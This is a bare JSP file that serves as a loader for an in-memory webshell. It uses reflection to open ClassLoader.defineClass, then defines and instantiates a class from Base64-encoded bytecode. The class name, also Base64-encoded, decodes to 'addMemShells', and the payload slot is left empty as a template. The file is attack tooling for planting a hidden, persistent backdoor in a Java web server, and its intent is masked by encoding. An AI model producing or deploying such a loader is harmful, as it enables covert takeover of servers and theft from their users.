<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Method" %>
<%
    ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
    String str = "";
    byte[] decode = Base64.getDecoder().decode(str);
    try {
        Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
        Method defineClass = aClass.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class zhangsan = (Class)defineClass.invoke(clzLoader, new String(Base64.getDecoder().decode("YWRkTWVtU2hlbGxz")), decode, 0, decode.length);
        zhangsan.newInstance();
    } catch (Exception e) {
        e.printStackTrace();
    }
%>